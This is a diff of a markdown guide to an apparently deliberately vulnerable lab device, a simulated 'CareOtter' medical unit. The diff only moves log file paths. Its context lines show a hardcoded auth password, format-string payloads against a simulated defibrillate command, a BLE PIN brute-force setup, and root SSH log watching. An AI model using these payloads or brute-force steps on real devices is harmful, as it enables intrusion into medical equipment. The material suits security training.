@@ -349,7 +349,7 @@ print(igp(0x09, b'sshd'))             # b'REBOOT_ERR'
 
 #### 0x0A GET\_LOG (requires auth)
 
-Returns the last 512 bytes of the careservice log in `/tmp/careservice.log`.
+Returns the last 512 bytes of the careservice log in `/var/log/careservice.log`.
 
 ```python
 igp(0x02, b'OtterMobile2026')
@@ -362,7 +362,7 @@ print(igp(0x0A))
 #### 0x0B DEFIBRILLATE (requires auth)
 
 Simulates a 200 J defibrillator discharge and logs the event to
-`/tmp/careotter_events.log`. **The payload is used as a format string in the therapy
+`/opt/careotter_events.log`. **The payload is used as a format string in the therapy
 log** (vuln #11).
 
 ```python
@@ -375,7 +375,7 @@ print(igp(0x0B, b'test_event'))
 # Exploit format string in therapy log
 print(igp(0x0B, b'%x.%x.%x.%x'))
 # Response: b'DEFIB_TRIGGERED:200J:...'
-# /tmp/careotter_events.log contains stack values
+# /opt/careotter_events.log contains stack values
 ```
 
 ---
@@ -784,7 +784,7 @@ ssh root@192.168.2.1 "ps | grep ble_server"
 # → shows the process
 
 # Monitor log after attack
-ssh root@192.168.2.1 "tail -f /tmp/ble_server.log 2>/dev/null || logread -f | grep BLE"
+ssh root@192.168.2.1 "tail -f /var/log/ble_server.log 2>/dev/null || logread -f | grep BLE"
 # → after ~2s the traceback appears:
 # ZeroDivisionError: float division by zero
 # [asyncio] Task exception was never retrieved
@@ -1011,7 +1011,7 @@ The following `bleak` script iterates `0000..9999` writing each candidate to `0x
 
 Iterates 0000..9999, writing each candidate to the Provisioning Auth
 characteristic (0xFF12). Detection: an external watcher tails
-/tmp/ble_server.log on the device over SSH and writes the matched line
+/var/log/ble_server.log on the device over SSH and writes the matched line
 to /tmp/careotter_pin_found; this script polls that sentinel file and
 stops as soon as it is non-empty.
 
@@ -1087,7 +1087,7 @@ Run the script together with the SSH watcher that creates the sentinel:
 # 1) Watcher: tails the device log, fills the sentinel on AUTH success
 rm -f /tmp/careotter_pin_found
 ( ssh root@192.168.2.1 \
-    "tail -n0 -F /tmp/ble_server.log | grep --line-buffered -m1 'AUTH success'" \
+    "tail -n0 -F /var/log/ble_server.log | grep --line-buffered -m1 'AUTH success'" \
     > /tmp/careotter_pin_found ) &
 
 # 2) Brute force in the foreground
@@ -1593,7 +1593,7 @@ igp(0x05, b'%x.%x.%x.%x.%x')
 # Read stack values — second sink (cmd 0x0B DEFIBRILLATE)
 igp(0x02, b'OtterMobile2026')
 igp(0x0B, b'%x.%x.%x.%x')
-# → Written to /tmp/careotter_events.log
+# → Written to /opt/careotter_events.log
 ```
 
 Note: `0x05` does not require authentication. `0x0B` requires authentication but has a second independent format string sink in the events log write path.
